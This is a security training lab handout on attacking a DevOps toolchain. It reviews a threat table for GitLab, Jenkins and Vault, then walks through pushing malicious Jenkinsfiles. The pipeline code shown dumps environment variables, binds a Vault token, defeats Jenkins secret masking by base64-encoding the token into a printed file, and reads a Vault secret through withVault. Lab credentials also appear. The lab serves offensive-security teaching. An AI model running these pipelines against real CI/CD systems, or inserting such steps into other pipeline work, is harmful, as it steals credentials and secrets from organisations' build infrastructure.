# LAB 1.1

## Attacking the DevOps toolchain

### Goals:

- Review the Rapid Risk Assessment of the DevOps Toolchain
- Make an unauthorized commit to the version control repository
- Create malicious Jenkins Builder and steal vault credentials
- Gain access to sensitive credentials

### DevOps Toolchain

Sign in to GitLab : student/NeverLookBack

Browse to docs/rapid-risk-assesment.md

For each Threat consider the vulnerabilities and the controls that can help the attacker to compromise the DevOps toolchain.

| Threat 1  |  Compromising a user’s VC credentials and creates an attacker Controlled SSH key |
| --- | --- |
| Vulnerabilities  | Guessing/Brute Force/ Weak Password/Malware/host |
| Security Controls | two factors authentication, password policy |

1- check if two factors authentication is enabled

2- Generate the md5 hash of the students SSH key account

```bash
ssh-keygen -l -E md5 -f .\hos_pub_key
```

| Threat 2 | Attacker makes an unauthorized commit to main branch, and trigger a new release that contain a backdoor or torjan |
| --- | --- |
| Vulnerabilities  | No branch protection |
| Security Controls | Apply branch protection, and implement a GitFlow  |

check if the DevOps project contain a protected branch

| Threat 3 | Attacker modifies high risk code without approval from the security team |
| --- | --- |
| Vulnerabilities  | No branch protection, no code owners |
| Security Controls | Apply branch protection, and implement a GitFlow , create the code owners file  |

Check if the account is connected to Jenkins via webhooks

Check the Jenkins file in Gitlab

| Threat 4 | CI/CD engine exposed to the internet |
| --- | --- |
| Vulnerabilities  | No hardening, no patching  |
| Security Controls | Jenkins not exposed to the internet, plugins are tested and patched |

Check if any of the Jenkins plugins need to be patched

analyze the project on Jenkins

| Threat 5 | Compromising Jenkins Injecting malicious code  |
| --- | --- |
| Vulnerabilities  | read access to a Jenkinsfile in the source code |
| Security Controls | Branch protection, GitFlow, separation of duties, codeowners |

Check Gitlab integration in Jenkins, which branch is used in the pipeline, how the steps of the pipeline are confugured?

| Threat 6 | Compromising a secret buy creating a malicious job in the CI/CD pipeline |
| --- | --- |
| Vulnerabilities  | No branch protection, no access management! |
| Security Controls | Branch protection, GitFlow, separation of duties, codeowners |

Check how jenkins communicate with vault in the plugin configuration and in the credential manager

sign-in to the vault server using yassine/NeverLookBack

try to read the seacret kv/**secrets/creds/yassine-secrets**

try to read the seacret kv/**secrets/creds/jenkins-secrets**

### Attack the DevOps Toolchain

Mission : Read the jenkins-secrets

Injecting code and run the pipeline

create an evil folder and create a Dockerfile

Change the Jenkins file with the code below 

```bash
pipeline {
    agent { 
        dockerfile {
            filename 'Dockerfile'
            dir 'evil'
            additionalBuildArgs '--tag h4kc/evil_image'
    } }
    stages {
        stage('Evil stage') {
            steps {
                sh 'env'
            }
        }
    }
}
```

push the code and  analyze the output, observe the images inside the host machine 

```bash
docker images
```

Now try the code below :

```bash
pipeline {
    agent { 
        dockerfile {
            filename 'Dockerfile'
            dir 'evil'
            additionalBuildArgs '--tag h4kc/evil_image'
        } 
    }
    
    stages {
        stage('Evil stage') {
            steps {
                script {
                    withCredentials([[$class: 'VaultTokenCredentialBinding', credentialsId: 'vault-jenkins-token-creds', vaultAddr: '', tokenVariable: 'VAULT_TOKEN']]) {
                        sh 'env'
                    }
                }
            }
        }
    }
}

```

check the output, what’s the value o the VAULT_TOKEN

Let’s bypass the security masking feature

```groovy
pipeline {
    agent { 
        dockerfile {
            filename 'Dockerfile'
            dir 'evil'
            additionalBuildArgs '--tag h4kc/evil_image'
        } 
    }
    
    stages {
        stage('Evil stage') {
            steps {
                script {
                    withCredentials([[$class: 'VaultTokenCredentialBinding', credentialsId: 'vault-jenkins-token-creds', vaultAddr: '', tokenVariable: 'VAULT_TOKEN']]) {
                        sh 'touch myfile.txt'
                        sh 'echo -n $VAULT_TOKEN | base64 >> myfile.txt'  
                    }
                     sh 'cat myfile.txt'
                }
            }
        }
    }
}

```

check now the output logs

can we read the jenkins-secret now ?

let’s try another path, what if we can’t access to vault ui 

```groovy
pipeline {
    agent { 
        dockerfile {
            filename 'Dockerfile'
            dir 'evil'
            additionalBuildArgs '--tag h4kc/evil_image'
        } 
    }
    
    stages {
        stage('Evil stage') {
            steps {
                script {
                    withVault([vaultSecrets: [[path: 'kv/secrets/creds/jenkins-secrets', secretValues: [[envVar: 'MY_SECRET', vaultKey: 'jenkin_secret_phrase']]]]]) {
                       sh 'echo $MY_SECRET > myfile.txt'
                    }
                     sh 'cat myfile.txt'
                }
            }
        }
    }
}

```

;)